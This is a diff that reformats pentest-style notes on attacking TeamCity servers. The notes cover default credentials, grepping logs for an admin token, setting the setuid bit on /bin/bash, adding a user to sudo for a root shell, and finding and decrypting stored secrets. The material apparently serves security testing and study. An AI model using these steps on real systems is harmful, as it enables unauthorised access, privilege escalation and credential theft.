@@ -2,7 +2,9 @@
 
 ## Default port: 8111
 
-## Default credentials: admin:admin teamcity:admin 
+## Default credentials: 
+
+    admin:admin teamcity:admin 
 
 # Techniques
 
@@ -12,7 +14,7 @@
 
 ### Example command to run if we have the privileges to read the teamcity-server.log:
 
- - sudo /usr/bin/cat /opt/JetBrains/TeamCity/logs/teamcity-server.log | grep -i token (Check the logs for a token that we can use as a password. No username.)
+    sudo /usr/bin/cat /opt/JetBrains/TeamCity/logs/teamcity-server.log | grep -i token (Check the logs for a token that we can use as a password. No username.)
 
 # Teamcity server foothold
 
@@ -28,13 +30,13 @@
 
 ## Commands to use:
 
- - 1) chmod u+s /bin/bash
+    chmod u+s /bin/bash
  
- - 2) usermod -aG sudo USER (Adds the user to sudo group)
+    usermod -aG sudo USER (Adds the user to sudo group)
 
 ### Then on our target machine if we have SSH access 
 
- - 2) sudo -s (Gain root shell)
+    sudo -s (Gain root shell)
 
 ## Alternate method: Agent
 
@@ -52,9 +54,9 @@
 
 ### Command to find secrets within data directory (Go to: Server Administration -> Global Settings)
 
- - grep -R zxx
+    grep -R zxx
 
 ### Then decrypt with the tool: https://github.com/0xE2/teamcity-unscrambler/
 
- - python3 unscrambler.py TEAMCITY_SECRET
+    python3 unscrambler.py TEAMCITY_SECRET
 
